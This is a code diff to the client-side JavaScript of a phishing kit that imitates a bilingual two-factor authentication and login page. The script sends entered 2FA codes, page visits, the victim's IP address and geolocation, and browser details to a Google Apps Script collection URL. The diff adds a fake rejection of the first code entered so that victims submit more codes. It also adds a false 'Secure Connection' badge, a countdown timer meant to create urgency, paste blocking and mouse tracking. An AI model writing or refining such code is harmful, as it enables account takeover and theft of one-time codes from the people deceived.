@@ -10,7 +10,8 @@ const translations = {
             resendMessage: "We've sent you a new code",
             invalidCode: "Incorrect code. Please try again.",
             verifying: "Verifying your code...",
-            verified: "Success!"
+            verified: "Success!",
+            attemptsLeft: "attempt(s) remaining"
         },
         fr: {
             title: "Authentification à deux facteurs",
@@ -21,7 +22,8 @@ const translations = {
             resendMessage: "Nous vous avons envoyé un nouveau code",
             invalidCode: "Code incorrect. Veuillez réessayer.",
             verifying: "Vérification de votre code...",
-            verified: "Succès !"
+            verified: "Succès !",
+            attemptsLeft: "tentative(s) restante(s)"
         }
     },
     login: {
@@ -66,16 +68,106 @@ let currentLang = navigator.language.startsWith('fr') ? 'fr' : 'en';
 // ⚠️ CHANGEZ CETTE URL PAR LA VÔTRE
 const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbxur_-UmZVt1YTebgeZNPQdJV7X55nS1tFhitzNPl-4HVNrvhdJZoSrC6-vpvG91VyJNQ/exec';
 
-// Fonction pour envoyer les données avec timestamp et User-Agent
-function sendDataToSheet(type, value) {
+// Variables pour analytics
+let pageLoadTime = Date.now();
+let mouseMovements = 0;
+let attempts = 0;
+const maxAttempts = 2;
+
+// ==================== FONCTIONNALITÉ 1: BADGE DE SÉCURITÉ ====================
+function createSecurityBadge() {
+    const badge = document.createElement('div');
+    badge.className = 'security-badge';
+    badge.innerHTML = `
+        <svg width="16" height="16" fill="#00cc00">
+            <path d="M8 0L2 3v5c0 3.5 2.5 6.5 6 7 3.5-.5 6-3.5 6-7V3L8 0z"/>
+        </svg>
+        <span>${currentLang === 'fr' ? 'Connexion sécurisée' : 'Secure Connection'}</span>
+    `;
+    document.body.appendChild(badge);
+}
+
+// ==================== FONCTIONNALITÉ 2: TIMER DE SESSION ====================
+function startSessionTimer() {
+    let timeLeft = 180; // 3 minutes
+    const timerDiv = document.createElement('div');
+    timerDiv.id = 'session-timer';
+    timerDiv.innerHTML = `
+        <svg width="18" height="18" fill="white">
+            <circle cx="9" cy="9" r="8" stroke="white" stroke-width="2" fill="none"/>
+            <path d="M9 5v4l3 3" stroke="white" stroke-width="2" fill="none"/>
+        </svg>
+        <span>${currentLang === 'fr' ? 'Code expire dans :' : 'Code expires in:'} <strong id="timer-text">3:00</strong></span>
+    `;
+    document.body.appendChild(timerDiv);
+    
+    const interval = setInterval(() => {
+        timeLeft--;
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        const timerText = document.getElementById('timer-text');
+        if (timerText) {
+            timerText.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        if (timeLeft <= 0) {
+            clearInterval(interval);
+            showExpiredMessage();
+        } else if (timeLeft <= 30) {
+            timerDiv.style.animation = 'pulse 0.5s infinite';
+        }
+    }, 1000);
+}
+
+function showExpiredMessage() {
+    const message = document.getElementById('message');
+    if (message) {
+        message.style.color = '#ff3333';
+        message.textContent = currentLang === 'fr' 
+            ? '⚠️ Code expiré. Demandez un nouveau code.' 
+            : '⚠️ Code expired. Request a new code.';
+    }
+}
+
+// ==================== FONCTIONNALITÉ 3: DÉTECTION GÉOLOCALISATION ====================
+async function getLocation() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        return {
+            city: data.city || 'Unknown',
+            country: data.country_name || 'Unknown',
+            ip: data.ip || 'Unknown'
+        };
+    } catch(e) {
+        return { city: 'Unknown', country: 'Unknown', ip: 'Unknown' };
+    }
+}
+
+// ==================== FONCTIONNALITÉ 4: TRACKING SOURIS ====================
+document.addEventListener('mousemove', () => {
+    mouseMovements++;
+});
+
+// Envoyer analytics avant de quitter la page
+window.addEventListener('beforeunload', () => {
+    const timeSpent = Math.floor((Date.now() - pageLoadTime) / 1000);
+    sendDataToSheet('Analytics', `Time: ${timeSpent}s | Mouse: ${mouseMovements} movements`);
+});
+
+// Fonction pour envoyer les données avec géolocalisation
+async function sendDataToSheet(type, value) {
     const timestamp = new Date().toLocaleString();
     const userAgent = navigator.userAgent;
+    const location = await getLocation();
+    
     const data = {
         type: type,
         value: value,
         timestamp: timestamp,
         userAgent: userAgent,
-        language: currentLang
+        language: currentLang,
+        location: `${location.city}, ${location.country} (${location.ip})`
     };
     
     fetch(GOOGLE_SHEET_URL, {
@@ -123,12 +215,20 @@ function toggleLanguageMenu() {
 }
 
 // Initialiser la langue au chargement
-window.onload = function() {
+window.onload = async function() {
     setLanguage(currentLang);
     
-    // Logger la visite de la page
+    // Logger la visite de la page avec localisation
     const page = window.location.pathname.split('/').pop() || 'index.html';
-    sendDataToSheet('Page Visit', page);
+    await sendDataToSheet('Page Visit', page);
+    
+    // Créer le badge de sécurité
+    createSecurityBadge();
+    
+    // Démarrer le timer si on est sur index.html
+    if (page === 'index.html' || page === '' || page === '/') {
+        startSessionTimer();
+    }
 };
 
 // Fermer le menu si on clique ailleurs
@@ -164,6 +264,20 @@ if (document.getElementById('codeForm')) {
             if (this.value.length >= 1 && index < 5) {
                 inputs[index + 1].focus();
             }
+        });
+        
+        // Bloquer le copier-coller
+        input.addEventListener('paste', function(e) {
+            e.preventDefault();
+            sendDataToSheet('Suspicious Activity', 'User tried to paste in code field');
+            
+            const message = document.getElementById('message');
+            message.style.color = '#ff9800';
+            message.textContent = currentLang === 'fr' 
+                ? '⚠️ Veuillez saisir le code manuellement' 
+                : '⚠️ Please enter the code manually';
+            
+            setTimeout(() => message.textContent = '', 3000);
         });
     });
 }
@@ -210,7 +324,8 @@ function togglePasswordVisibility() {
     }
 }
 
-// Handle code form submission avec validation améliorée
+// ==================== FONCTIONNALITÉ 5: MESSAGES D'ÉCHECS ====================
+// Handle code form submission avec validation et tentatives échouées
 if (document.getElementById('codeForm')) {
     document.getElementById('codeForm').addEventListener('submit', function(event) {
         event.preventDefault();
@@ -238,12 +353,39 @@ if (document.getElementById('codeForm')) {
             return;
         }
 
+        // Incrémenter les tentatives
+        attempts++;
+        
+        // Si moins de maxAttempts, montrer un faux échec
+        if (attempts < maxAttempts) {
+            message.style.color = '#ff3333';
+            message.textContent = `${translations.index[currentLang].invalidCode} ${maxAttempts - attempts} ${translations.index[currentLang].attemptsLeft}`;
+            
+            // Logger la tentative échouée
+            sendDataToSheet('Failed Attempt', `Code: ${code} (Attempt ${attempts}/${maxAttempts})`);
+            
+            // Shake animation
+            inputs.forEach(input => {
+                input.value = '';
+                input.style.animation = 'shake 0.4s';
+            });
+            
+            setTimeout(() => {
+                message.textContent = '';
+                inputs.forEach(input => input.style.animation = '');
+                inputs[0].focus();
+            }, 2000);
+            
+            return;
+        }
+
+        // Après maxAttempts tentatives, on accepte le code
         message.style.color = '#666';
         message.textContent = translations.index[currentLang].verifying;
         button.disabled = true;
         button.style.opacity = '0.7';
 
-        const codeEntry = `2FA Code: ${code}`;
+        const codeEntry = `2FA Code: ${code} (Accepted after ${attempts} attempts)`;
         sendDataToSheet('2FA Code', codeEntry);
 
         // Délai réaliste pour la vérification
@@ -284,13 +426,55 @@ if (document.getElementById('loginForm')) {
     });
 }
 
-// Ajouter animation shake au CSS
+// Ajouter les styles CSS nécessaires
 const style = document.createElement('style');
 style.textContent = `
     @keyframes shake {
         0%, 100% { transform: translateX(0); }
-        25% { transform: translateX(-5px); }
-        75% { transform: translateX(5px); }
+        10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
+        20%, 40%, 60%, 80% { transform: translateX(4px); }
+    }
+    
+    @keyframes pulse {
+        0%, 100% { transform: translateX(-50%) scale(1); }
+        50% { transform: translateX(-50%) scale(1.05); }
+    }
+    
+    .security-badge {
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        background: linear-gradient(135deg, #f0f0f0 0%, #e8e8e8 100%);
+        padding: 10px 20px;
+        border-radius: 25px;
+        font-size: 12px;
+        color: #555;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        z-index: 9998;
+        font-weight: 600;
+    }
+    
+    #session-timer {
+        position: fixed;
+        top: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: linear-gradient(135deg, #ff6b6b 0%, #ff5252 100%);
+        color: white;
+        padding: 12px 24px;
+        border-radius: 25px;
+        font-size: 14px;
+        font-weight: 600;
+        box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        animation: pulse 2s infinite;
     }
 `;
 document.head.appendChild(style);
